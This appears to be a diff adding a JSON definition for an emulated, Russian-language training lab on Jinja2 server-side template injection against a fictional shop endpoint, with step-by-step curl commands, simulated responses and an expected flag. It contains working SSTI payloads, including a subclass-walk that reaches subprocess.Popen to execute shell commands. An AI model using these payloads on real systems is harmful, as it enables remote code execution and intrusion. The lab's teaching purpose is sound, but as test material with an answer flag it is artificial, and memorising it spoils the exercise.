@@ -1,0 +1,27 @@
+{
+  "id": "web-ssti-core",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{jinja2_subcl4ss3s_t0_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: SSTI — Jinja2 от {{7*7}} до RCE\n\n`https://shop.local/greet?name=Alice` приветствует по имени. Проверь, исполняет\nли сервер выражения, определи движок и дойди до выполнения команд.\n\nПодсказка по движку: payload с `[` ломает glob, а `${...}` вырезается, поэтому\nсложные payload'ы лежат в файле `rce.txt` и шлются через `--data-urlencode name@`.\n\n1. База:\n\n   curl -s 'https://shop.local/greet?name=Alice'\n\n2. Математика (какой синтаксис сработал?):\n\n   curl -s 'https://shop.local/greet?name={{7*7}}'\n   curl -s 'https://shop.local/greet?name=#{7*7}'\n   curl -s 'https://shop.local/greet?name=<%= 7*7 %>'\n\n3. Читаем объекты: {{config}} отдаёт конфиг:\n\n   curl -s --data-urlencode 'name={{config}}' https://shop.local/greet\n\n4. Смотрим подклассы (путь к subprocess) — payload в файле:\n\n   curl -s --data-urlencode 'name@subclasses.txt' https://shop.local/greet\n\n5. Выполняем команду и читаем флаг:\n\n   curl -s --data-urlencode 'name@rce.txt' https://shop.local/greet > found.txt\n\n6. Набери `check`.\n" },
+    { "path": "/home/student/task/subclasses.txt", "text": "{{''.__class__.__mro__.__getitem__(1).__subclasses__()}}\n" },
+    { "path": "/home/student/task/rce.txt", "text": "{{''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(444)('cat /flag.txt',shell=True,stdout=-1).communicate()}}\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/greet)",
+      "cases": [
+        { "match": "rce\\.txt|subprocess|communicate", "example": "--data-urlencode 'name@rce.txt' https://shop.local/greet", "output": "Hello, b'nto{jinja2_subcl4ss3s_t0_rce}\\n'\n" },
+        { "match": "subclasses\\.txt|subclasses", "example": "--data-urlencode 'name@subclasses.txt' https://shop.local/greet", "output": "Hello, [<class 'type'>, <class 'weakref'>, ..., <class 'subprocess.Popen'>]\n" },
+        { "match": "config", "example": "--data-urlencode 'name={{config}}' https://shop.local/greet", "output": "Hello, <Config {'SECRET_KEY': 'dev-key', 'DEBUG': False}>\n" },
+        { "match": "%24%7B7|\\$\\{7|%24\\{7", "example": "--data-urlencode 'name=${7*7}' https://shop.local/greet", "output": "Hello, ${7*7}\n" },
+        { "match": "7\\*7|7%2A7", "example": "'https://shop.local/greet?name={{7*7}}'", "output": "Hello, 49\n" },
+        { "match": "%23\\{7|#\\{7|%3C%=|<%=", "example": "'https://shop.local/greet?name=#{7*7}'", "output": "Hello, #{7*7}\n" },
+        { "match": "name=Alice|name=alice", "example": "'https://shop.local/greet?name=Alice'", "output": "Hello, Alice\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /greet на shop.local.\n"
+    }
+  }
+}
